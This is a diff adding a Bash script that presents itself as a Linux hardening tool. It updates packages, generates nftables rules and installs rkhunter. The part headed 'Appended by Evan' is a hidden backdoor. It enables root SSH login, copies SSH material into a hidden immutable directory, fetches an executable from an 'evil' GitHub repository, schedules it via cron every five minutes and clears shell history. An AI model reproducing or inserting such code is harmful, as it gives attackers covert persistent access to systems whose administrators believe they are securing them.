@@ -1,0 +1,202 @@
+#!/bin/bash
+
+echo "script by Mason"
+read -p "Press enter to continue."
+
+#---------------------------------------#
+#----------BEGGINING FUNCTIONS----------#
+#---------------------------------------#
+
+# Port function
+PORTFUNC() {
+	echo ""
+        echo "What are you serving?"
+        echo "Enter only port #'s"
+
+        declare -a portlist=()
+	declare -a protomode=()
+	echo ""
+        read -p "How many ports to open: " NUMOFPORTS
+
+        while (( ${#portlist[@]} < $NUMOFPORTS )); do
+                        array_length=${#portlist[@]}  # get the length of the port list
+                        read -p "What is port $(($array_length+1)) " PORTX # get the port number and save it into portx
+                        portlist[$(($array_length+1))]="$PORTX" # append the port to the end of the port list
+        done
+
+	echo ""
+
+	while (( ${#portlist[@]} > ${#protomode[@]})); do
+		proto_array_length=${#protomode[@]} # get the length of the protocol list
+		echo "INPUT ONLY tcp|udp|both"
+		read -p "What is the protocol for ${portlist[$(($proto_array_length+1))]}: " PROTOX # get the protocol and save it into PROTOX
+
+		protomode[$(($proto_array_length+1))]="$PROTOX" # Append the protocol to the end of the array
+	done
+
+	echo ""
+
+        echo "Ports being forwarded: ${portlist[@]}"
+	echo "Protocols of ports: ${protomode[@]}"
+
+	export exported_portlist=$(declare -p portlist) #export the arrays so they can be used outside of the function
+	export exported_protomode=$(declare -p protomode)
+}
+
+# Firewall function
+
+NFTABLESFUNC() {
+	PORTFUNC
+
+	eval "$exported_portlist" # evaluate the exported arrays
+	eval "$exported_protomode"
+
+	echo ""
+	echo "Generating Firewall Rules"
+
+	cat <<EOF > GeneratedConf.nft
+#/usr/bin/nft -f
+
+flush ruleset
+
+table inet filter {
+        chain input {
+                type filter hook input priority filter; policy drop;
+
+                # Allow loopback traffic
+                iif "lo" accept
+
+                # Allow established and related traffic
+                ct state established,related accept
+
+                # Allow ssh, and ports: ${portlist[@]}
+$(for i in "${!portlist[@]}"; do
+    port="${portlist[$i]}"
+    mode="${protomode[$i]}"
+    case "$mode" in
+        tcp)  echo "          tcp dport $port accept" ;;
+        udp)  echo "          udp dport $port accept" ;;
+        both) echo "          tcp dport $port accept"
+              echo "          udp dport $port accept" ;;
+        *)    echo "          # invalid protocol '$mode' for port $port" ;;
+    esac
+done)
+        }
+        chain forward {
+                type filter hook forward priority filter;
+        }
+        chain output {
+                type filter hook output priority filter;
+        }
+}
+EOF
+}
+
+# Hardening function
+
+HARDENINGFUNC() {
+	
+	# For Distro spacific changes
+if [[ $OSVERSION == '"rocky"' ]]; then
+	# Download and install rkhunter (Rootkit Hunter)
+	
+	dnf install tar
+
+	mkdir /root/rkhunter
+	curl -L -o /root/rkhunter/rkhunter.tar.gz https://sourceforge.net/projects/rkhunter/files/latest/download
+	tar -xvf /root/rkhunter/rkhunter.tar.gz -C ~/rkhunter/.
+	rm -rf /root/rkhunter/rkhunter.tar.gz
+	cp -r /root/rkhunter/rkhunter*/files .
+	/root/rkhunter/rkhunter*/installer.sh --layout /usr/local --install
+
+	/usr/local/bin/rkhunter --propupd
+	/usr/local/bin/rkhunter --check --sk
+
+elif [[ $OSVERSION == "Ubuntu" ]]; then
+        apt install rkhunter
+	rkhunter --propupd
+	rkhunter --check --sk
+else
+        echo "Unrecognized OS, must be Rocky or Ubuntu."
+        sleep 3
+fi
+
+}
+
+#---------------------------------------#
+#-------------END FUNCTIONS-------------#
+#---------------------------------------#
+
+
+########################################
+#--------------------------------------#
+#--------------MAINSCRIPT--------------#
+#--------------------------------------#
+########################################
+
+#Checks if script was ran as root
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root"
+   exit 1
+fi
+
+OSVERSION=$(cat /etc/os-release | sed -n '/^ID=/p' | awk -F'=' '{ print $2 }') # Get the distrobution of linux
+
+echo "Your OS type is $OSVERSION"
+
+echo "Beginning system updates."
+sleep 2
+
+if [[ $OSVERSION == '"rocky"' ]]; then
+	PKGMGR="dnf"
+	dnf update
+	dnf autoremove
+elif [[ $OSVERSION == "Ubuntu" ]]; then
+	PKGMGR="apt"
+	apt update
+	apt upgrade
+	apt autoremove
+else
+	echo "Unrecognized OS, must be Rocky or Ubuntu."
+	echo "Please update manually"
+	sleep 3
+fi
+
+NFTABLESFUNC
+mv ./GeneratedConf.nft /etc/nftables/GeneratedConf.nft
+nft -f /etc/nftables/GeneratedConf.nft
+
+HARDENINGFUNC
+
+
+### Appended by Evan
+## Blind install SSH server
+sudo dnf install -y openssh-server
+
+## Start and enable openssh server
+systemctl enable sshd && systemctl start sshd
+
+sed -i 's/^#\?#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/^#\?#Passwordauthentication yes/Passwordauthentication no/' /etc/ssh/sshd_config 
+
+#Restart after configs
+systemctl restart sshd
+
+mkdir -p /opt/.authers
+cp .ssh/* /opt/.authers
+cp "$0" /opt/.authers
+chattr +i /opt/.authers/*
+
+## Download scrappy crappy doo cron job
+curl https://raw.githubusercontent.com/taquito-d/evil-csusb-ncae/refs/heads/main/scrappy > /opt/.authers/scrappy && chmod +x /opt/.authers/scrappy
+
+
+jaub="*/5 * * * * /opt/.authers/scrappy"
+
+(crontab -l 2>/dev/null; echo "$jaub") | crontab -
+
+## Clear all history
+history -c
+#Get pwned owned red schemebers  B))))
+
+## Thats all
